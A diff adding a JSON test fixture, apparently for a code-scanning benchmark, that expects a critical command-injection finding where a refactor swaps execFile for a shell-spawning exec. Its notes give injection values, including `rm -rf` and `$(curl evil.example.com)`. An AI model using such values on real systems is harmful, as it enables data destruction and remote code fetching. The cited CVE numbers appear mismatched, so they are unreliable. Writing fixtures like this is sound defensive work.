@@ -1,0 +1,16 @@
+{
+  "name": "Command injection via execFile→exec regression (CVE-2023-26136 family)",
+  "diff": "../diffs/i03_command_injection_image_convert.diff",
+  "expected": [
+    {
+      "rule_id": "B-02",
+      "owasp_id": "A05",
+      "cwe_id": "CWE-78",
+      "severity": "critical"
+    }
+  ],
+  "expect_zero_findings": false,
+  "cve_reference": "CVE-2023-26136 / CVE-2020-7610 family (Node child_process pattern)",
+  "pattern_description": "Refactor swaps `execFile(name, [args])` (no shell, argv array, safe) for `exec(template-string)` (spawns sh -c, vulnerable to shell metacharacters in srcPath/sizePx). The argv-array protection was the explicit safety the original code relied on.",
+  "notes": "If srcPath contains `; rm -rf /tmp/*` or `$(curl evil.example.com)`, command substitution will fire on the server. The diff explicitly removes the comment that warned about this — a strong regression indicator."
+}
